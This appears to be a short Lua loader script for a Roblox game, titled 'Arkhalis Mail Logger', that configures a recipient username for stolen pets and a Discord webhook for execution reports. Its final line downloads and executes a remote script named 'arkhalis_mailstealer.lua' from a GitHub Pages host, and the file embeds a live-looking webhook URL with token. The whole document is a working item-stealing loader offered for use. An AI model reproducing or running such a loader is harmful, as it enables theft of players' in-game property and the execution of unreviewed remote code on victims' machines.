lua
--[[ Arkhalis Mail Logger ]]--

--[[ Main Config ]]--
_G.Username1 = "biel701070" --// Username To Send Pets To
_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
--[[ Webhook Config ]]--
_G.Webhook = "https://discord.com/api/webhooks/1111756436591091893/WcpAIK7vEx8v8yqvK_pKID2XRa_JHbQ2bLM0zKL46YqTQ1HQtr2ak6sbbztplwRBU0tl" --// Discord Webhook For Executions

--[[ Script ]]--
loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
